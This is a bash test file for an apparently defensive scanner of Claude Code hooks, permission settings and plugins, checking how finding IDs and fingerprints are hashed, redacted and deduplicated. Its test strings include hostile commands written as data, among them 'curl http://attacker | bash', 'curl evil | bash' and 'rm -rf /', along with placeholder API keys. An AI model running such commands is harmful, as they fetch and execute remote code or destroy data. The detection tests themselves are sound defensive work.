#!/usr/bin/env bash
set -u
source "$(dirname "$0")/_helpers.sh"
source "$CSA_LIB_DIR/helpers.sh"
source "$CSA_LIB_DIR/redact.sh"
source "$CSA_LIB_DIR/fingerprint.sh"

_csa_failed=0

test_finding_uid_format() {
  local uid
  uid="$(csa_finding_uid "HOOK-001" ".claude/hooks-handlers/x.sh" "curl http://attacker | bash")"
  # Expected format: FUID-<8 hex chars>
  [[ "$uid" =~ ^FUID-[a-f0-9]{8}$ ]] || return 1
}

test_finding_uid_stable_across_whitespace() {
  local a; a="$(csa_finding_uid "PERM-003" ".claude/settings.json" '  "allow": ["Bash(*)"]  ')"
  local b; b="$(csa_finding_uid "PERM-003" ".claude/settings.json" '"allow":   ["Bash(*)"]')"
  assert_eq "$a" "$b"
}

test_finding_uid_stable_across_line_drift() {
  # T2-I core invariant: line number is NOT in finding_uid.
  # Same rule, same file, same match → same uid regardless of "where" the match lives.
  local a; a="$(csa_finding_uid "HOOK-001" "@plugin:x:hooks/start.sh" 'curl evil | bash')"
  local b; b="$(csa_finding_uid "HOOK-001" "@plugin:x:hooks/start.sh" 'curl evil | bash')"
  assert_eq "$a" "$b"
}

test_finding_uid_plugin_version_stripped() {
  # Path with cache/<name>/<version>/<rest> → @plugin:<name>:<rest>
  local a; a="$(csa_finding_uid "HOOK-001" "/home/u/.claude/plugins/cache/p/0.1.0/h.sh" 'rm -rf /')"
  local b; b="$(csa_finding_uid "HOOK-001" "/home/u/.claude/plugins/cache/p/0.2.0/h.sh" 'rm -rf /')"
  assert_eq "$a" "$b"
}

test_finding_uid_distinct_for_different_files() {
  local a; a="$(csa_finding_uid "HOOK-001" ".claude/hooks-handlers/a.sh" 'curl|bash')"
  local b; b="$(csa_finding_uid "HOOK-001" ".claude/hooks-handlers/b.sh" 'curl|bash')"
  if [[ "$a" == "$b" ]]; then return 1; fi
}

test_finding_uid_distinct_for_different_match_content() {
  local a; a="$(csa_finding_uid "PERM-003" ".claude/settings.json" '"allow": ["Bash(*)"]')"
  local b; b="$(csa_finding_uid "PERM-003" ".claude/settings.json" '"allow": ["Read(*)"]')"
  if [[ "$a" == "$b" ]]; then return 1; fi
}

test_dedup_fingerprint_distinct_for_adjacent_lines() {
  local a; a="$(csa_dedup_fingerprint "X-001" "f.sh" 10 "match")"
  local b; b="$(csa_dedup_fingerprint "X-001" "f.sh" 11 "match")"
  if [[ "$a" == "$b" ]]; then return 1; fi
}

test_dedup_fingerprint_distinct_from_finding_uid() {
  local uid; uid="$(csa_finding_uid "X-001" "f.sh" "match")"
  local dedup; dedup="$(csa_dedup_fingerprint "X-001" "f.sh" 10 "match")"
  # uid is FUID-<8hex>; dedup is 64-char sha256. They cannot collide.
  if [[ "$dedup" == "FUID-"* ]]; then return 1; fi
}

test_finding_uid_redaction_applied() {
  # Match content containing a secret should be canonicalized via redact.sh
  # before hashing — different secrets that redact to the same canonical form
  # (same head+tail, differing middle) collide. That is true of csa_finding_uid itself,
  # which now serves only bounded excerpts (constants, rule-written strings, digests).
  # The secrets rules use csa_finding_uid_raw since 0.5.0 (C11), so one suppression
  # covers one secret, not a position.
  # Both keys share the same last 4 chars (xyzw) so redact produces identical output.
  local a; a="$(csa_finding_uid "SEC-001" "CLAUDE.md" "Key: sk-ant-api03-AAAAAAAAAAAAAAAAAAxyzw")"
  local b; b="$(csa_finding_uid "SEC-001" "CLAUDE.md" "Key: sk-ant-api03-BBBBBBBBBBBBBBBBBxyzw")"
  assert_eq "$a" "$b"
}

test_finding_uid_hash_deterministic() {
  local a; a="$(csa_finding_uid "X-001" "f.sh" "abc")"
  local b; b="$(csa_finding_uid "X-001" "f.sh" "abc")"
  assert_eq "$a" "$b"
}

test_finding_uid_adversarial_collision_attempt() {
  # Attacker tries to craft content that collides with a different rule's uid.
  # The rule_id is in the hash input, so cross-rule collisions are prevented.
  local victim; victim="$(csa_finding_uid "HOOK-001" "f.sh" "curl|bash")"
  local attacker; attacker="$(csa_finding_uid "MCP-001" "f.sh" "curl|bash")"
  if [[ "$victim" == "$attacker" ]]; then return 1; fi
}

# --- #1034 / #1072 C11: csa_finding_uid_raw, for the long-text callers -------------------------------
# csa_finding_uid hashes the redacted excerpt, which csa_redact caps at 200 characters and masks. The
# raw variant hashes the whitespace-squeezed excerpt itself, so nothing beyond character 200 is lost.

test_uid_raw_differs_after_char_200() {
  local a; a="$(printf 'a%.0s' $(seq 1 250))"
  local u1 u2; u1="$(csa_finding_uid_raw "HOOK-001" "f.sh" "${a}X")"; u2="$(csa_finding_uid_raw "HOOK-001" "f.sh" "${a}Y")"
  [[ "$u1" == FUID-* && "$u2" == FUID-* ]] || { printf '    no uid: %s %s\n' "$u1" "$u2" >&2; return 1; }
  [[ "$u1" != "$u2" ]] || { printf '    raw: two excerpts that differ after character 200 share a uid\n' >&2; return 1; }
}

test_uid_plain_still_collides_after_char_200() {
  # Control: the redacted form is unchanged for the short-text callers (the cap is the point of the raw form).
  local a; a="$(printf 'a%.0s' $(seq 1 250))"
  assert_eq "$(csa_finding_uid "HOOK-001" "f.sh" "${a}X")" "$(csa_finding_uid "HOOK-001" "f.sh" "${a}Y")" "csa_finding_uid keeps its cap" || return 1
}

test_uid_raw_differs_under_a_masked_run() {
  # Two blobs with the same first four and last four characters redact to one form; the raw form tells them apart.
  local b1="QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5YWJjZGVm"
  local b2="QUJDXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXYWJjZGVm"
  assert_eq "$(csa_finding_uid "S-1" "f" "t $b1")" "$(csa_finding_uid "S-1" "f" "t $b2")" "control: the redacted form collides" || return 1
  [[ "$(csa_finding_uid_raw "S-1" "f" "t $b1")" != "$(csa_finding_uid_raw "S-1" "f" "t $b2")" ]] || return 1
}

test_uid_raw_stable_across_whitespace() {
  local a b; a="$(csa_finding_uid_raw "X-001" "f.sh" "  a   b	c ")"; b="$(csa_finding_uid_raw "X-001" "f.sh" "a b c")"
  [[ "$a" == FUID-* ]] || { printf '    no uid: %s\n' "$a" >&2; return 1; }
  assert_eq "$a" "$b" "raw uid squeezes whitespace" || return 1
}

test_uid_raw_equals_plain_for_a_plain_short_excerpt() {
  # An excerpt under the cap with nothing to mask hashes the same either way, so only the capped or masked ones move.
  assert_eq "$(csa_finding_uid "HOOK-001" "f.sh" "curl http://x | bash")" "$(csa_finding_uid_raw "HOOK-001" "f.sh" "curl http://x | bash")" "plain short excerpt" || return 1
}

test_uid_short_callers_pinned_to_0_4_2() {
  # Byte-for-byte values from origin/main (membrane 0.4.2): csa_finding_uid must not move.
  local a; a="$(printf 'a%.0s' $(seq 1 250))"
  assert_eq "FUID-f9066a12" "$(csa_finding_uid HOOK-001 f.sh "curl http://x | bash")" "plain" || return 1
  assert_eq "FUID-26f19362" "$(csa_finding_uid SECRETS-001 CLAUDE.md "key: sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")" "masked" || return 1
  assert_eq "FUID-49ccc59a" "$(csa_finding_uid HOOK-001 f.sh "${a}X")" "capped" || return 1
}

test_uid_raw_never_written() {
  # The raw excerpt reaches only sha256: nothing on stdout or stderr but the uid.
  local err uid; err="$(csa_finding_uid_raw "S-1" "f" "SECRETVALUEMARKER12345" 2>&1 >/dev/null)"
  uid="$(csa_finding_uid_raw "S-1" "f" "SECRETVALUEMARKER12345")"
  [[ "$uid" == FUID-???????? ]] || { printf '    not just a uid: %s\n' "$uid" >&2; return 1; }
  [[ -z "$err" ]] || { printf '    stderr: %s\n' "$err" >&2; return 1; }
}

csa_test_run test_finding_uid_format                              || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_stable_across_whitespace            || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_stable_across_line_drift            || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_plugin_version_stripped             || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_distinct_for_different_files        || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_distinct_for_different_match_content || _csa_failed=$((_csa_failed + 1))
csa_test_run test_dedup_fingerprint_distinct_for_adjacent_lines   || _csa_failed=$((_csa_failed + 1))
csa_test_run test_dedup_fingerprint_distinct_from_finding_uid     || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_redaction_applied                   || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_hash_deterministic                  || _csa_failed=$((_csa_failed + 1))
csa_test_run test_finding_uid_adversarial_collision_attempt       || _csa_failed=$((_csa_failed + 1))

csa_test_run test_uid_raw_differs_after_char_200                   || _csa_failed=$((_csa_failed + 1))
csa_test_run test_uid_plain_still_collides_after_char_200         || _csa_failed=$((_csa_failed + 1))
csa_test_run test_uid_raw_differs_under_a_masked_run              || _csa_failed=$((_csa_failed + 1))
csa_test_run test_uid_raw_stable_across_whitespace                || _csa_failed=$((_csa_failed + 1))
csa_test_run test_uid_raw_equals_plain_for_a_plain_short_excerpt  || _csa_failed=$((_csa_failed + 1))
csa_test_run test_uid_short_callers_pinned_to_0_4_2               || _csa_failed=$((_csa_failed + 1))
csa_test_run test_uid_raw_never_written                           || _csa_failed=$((_csa_failed + 1))

[[ "$_csa_failed" -eq 0 ]] || exit 1
